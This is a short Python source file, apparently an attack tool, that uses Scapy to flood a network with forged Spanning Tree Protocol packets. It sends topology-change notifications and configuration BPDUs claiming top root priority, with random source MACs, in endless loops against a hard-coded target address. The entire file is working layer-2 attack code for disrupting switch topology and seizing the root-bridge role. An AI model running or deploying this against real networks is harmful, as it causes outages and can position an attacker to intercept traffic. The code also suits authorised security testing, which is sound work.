import socket
from scapy.all import *
from utils.GetIpMac import *

class stplib:
	target_ip=''
	target_mac=''
	host_ip=''
	host_mac=''
	temp_mac=RandMAC("*:*:*:*:*:*")
	stpdict={'proto':0x0000,'bpdutype':0x00,'bpduflags':0x01,'rootid':0x01,'rootmac':temp_mac,\
			'pathcost':0,'bridgeid':0x01,'bridgemac':temp_mac,'portid':0x8002}
	def __init__(self,target_ip):
		self.target_ip=target_ip
		self.target_mac=getmacbyip(target_ip)
		self.target_mac="aa:bb:cc:80:01:00"
		self.host_ip=get_ip_address('eth0')
		self.host_mac=get_mac_address()
	def run_tcnflood(self):#rao luan stp topology
		eth=Ether(src=RandMAC("*:*:*:*:*:*"),dst=self.target_mac)
		llc=LLC(dsap=0x42,ssap=0x42,ctrl=0x03)
		stp=STP(proto=0x0000,bpdutype=0x80)
		packet=eth/llc/stp
		sendp(packet,iface='eth0')

	def run_confflood(self):
		eth=Ether(src=RandMAC("*:*:*:*:*:*"),dst=self.target_mac)
		llc=LLC(dsap=0x42,ssap=0x42,ctrl=0x03)
		stp=STP(proto=self.stpdict['proto'],bpdutype=self.stpdict['bpdutype'],bpduflags=self.stpdict['bpduflags'],\
			rootid=self.stpdict['rootid'],rootmac=self.stpdict['rootmac'],\
			pathcost=self.stpdict['pathcost'],bridgeid=self.stpdict['bridgeid'],\
			bridgemac=self.stpdict['bridgemac'],portid=0x8002,)
		packet=eth/llc/stp
		sendp(packet,iface='eth0')

	def run(self,mode):
		while True:
			if mode==0:
				self.run_confflood()
			if mode==1:
				self.run_tcnflood()



if __name__=='__main__':
	a=stplib("192.168.237.11")
	#a.run_tcnflood()
	while True:
		a.run_confflood()


